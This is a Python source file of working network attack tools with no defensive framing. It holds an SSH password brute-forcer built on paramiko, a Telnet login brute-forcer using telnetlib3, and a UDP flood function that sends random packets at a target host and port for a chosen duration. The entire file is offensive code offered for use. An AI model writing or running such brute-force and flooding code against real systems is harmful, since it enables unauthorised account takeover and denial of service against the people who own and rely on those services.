import paramiko
import asyncio
import telnetlib3
import time
import socket
import random

def brute_force_ssh(target, username, password_list, port=22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    results = []
    
    for password in password_list:
        password = password.strip()
        try:
            client.connect(target, port=port, username=username, password=password, timeout=3)
            # If successful
            success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
            results.append({"status": "success", "password": password, "message": success_msg})
            client.close()
            return results # Stop after finding one
        except paramiko.AuthenticationException:
            # results.append({"status": "fail", "password": password, "message": "Authentication failed"})
            pass
        except Exception as e:
            # Log connection errors for debugging
            print(f"[ERROR] SSH Connection failed: {e}")
            pass
            
    client.close()
    if not results:
        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
        
    return results

async def telnet_login_check(target, port, username, password):
    try:
        reader, writer = await asyncio.wait_for(telnetlib3.open_connection(target, port), timeout=5)
        
        # Read initial banner until login prompt
        # Note: Prompts vary, some systems send "Login:" others "login:"
        await asyncio.wait_for(reader.readuntil("ogin:"), timeout=5) 
        writer.write(username + "\n")
        
        # Read until password
        await asyncio.wait_for(reader.readuntil("assword:"), timeout=5)
        writer.write(password + "\n")
        
        # Check result
        # Read a bit to see if we get a shell prompt or error
        response = await asyncio.wait_for(reader.read(1024), timeout=5)
        
        writer.close()
        
        if "Login incorrect" not in response and "failed" not in response:
            return True
        return False
    except Exception as e:
        # print(f"Telnet Error: {e}")
        return False

def brute_force_telnet(target, username, password_list, port=23):
    results = []
    
    for password in password_list:
        password = password.strip()
        try:
            # Create a new event loop for each attempt to avoid "loop is closed" issues in this sync function context
            # Or just use asyncio.run which handles a fresh loop
            is_success = asyncio.run(telnet_login_check(target, port, username, password))
            
            if is_success:
                 success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
                 results.append({"status": "success", "password": password, "message": success_msg})
                 return results
                 
        except Exception as e:
            print(f"Telnet Attempt Error: {e}")
            pass
            
    if not results:
        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
        
    return results

def udp_flood(target, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)
    timeout = time.time() + duration
    sent = 0

    try:
        while time.time() < timeout:
            client.sendto(bytes_to_send, (target, port))
            sent += 1
            
        return {"status": "success", "message": f"UDP Flood finished. Sent {sent} packets to {target}:{port} in {duration}s."}
    except Exception as e:
        return {"status": "error", "message": str(e)}
